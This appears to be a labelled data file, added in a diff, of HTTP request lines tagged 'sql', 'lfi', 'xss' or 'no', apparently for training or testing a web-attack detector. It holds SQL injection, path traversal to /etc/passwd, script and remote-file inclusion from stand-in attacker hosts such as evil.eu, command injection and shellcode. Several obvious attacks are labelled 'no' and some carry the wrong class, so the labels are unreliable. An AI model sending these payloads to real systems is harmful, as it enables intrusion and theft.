@@ -1,0 +1,37 @@
+GET /login.php/?username=admin&password=password HTTP/1.0,no
+GET /connection.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb+3\x88\xd2%z HTTP/1.0,no
+GET /page/about-us/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0,sql
+GET /index.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0,lfi
+GET /login.php/?post==<?php print $settings[database][password]; ?> HTTP/1.0,no
+GET /index.php/?id=0%20or%201=1 HTTP/1.0,sql
+GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.1,no
+GET /?post=%3script%3ealert(1); HTTP/1.1,xss
+GET /?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.1,xss
+POST /register.php/?file=http://evil.eu/sh HTTP/1.0,no
+GET /connection.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0,xss
+POST /api/v1/register/?username=admin&password=1234 HTTP/1.0,no
+POST /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.1,lfi
+GET /login.php/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0,lfi
+GET /index.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1,no
+GET /core/files/js/upload.js/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.1,xss
+POST /index.php/?id=0%20or%201=1 HTTP/1.0,sql
+GET /api/v1/login/?file=http://evil.eu/sh HTTP/1.0,no
+GET /?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0,no
+GET /update.php/?ip=|+ls+-l HTTP/1.0,no
+GET /index.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0,lfi
+GET /orders.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0,lfi
+GET /core/files/js/upload.js/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0,xss
+GET /core/files/js/upload.js/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0,no
+POST /core/themes/theme.inc/?file=http://evil.eu/sh HTTP/1.0,no
+GET /?post==<?php print $settings[database][password]; ?> HTTP/1.0,no
+GET /index.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0,no
+GET /connection.php/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0,lfi
+GET /core/files/js/upload.js/?page=/../../../../../../etc/passwd HTTP/1.0,lfi
+GET /register.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0,xss
+GET /?username=admin&password=admin HTTP/1.0,no
+GET /%u0061?[buffer]=89898 HTTP/1.0,no
+GET /?post=%3script%3ealert(1); HTTP/1.0,xss
+GET /?ip=|+ls+-l HTTP/1.0,no
+GET /api/v1/login/%u0061?[buffer]=89898 HTTP/1.0,no
+GET /register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0,no
+GET /connection.php/%2e%2e%2f%2e%2e%2f%2e%2e%2ffile:///etc/passwd HTTP/1.0,lfi
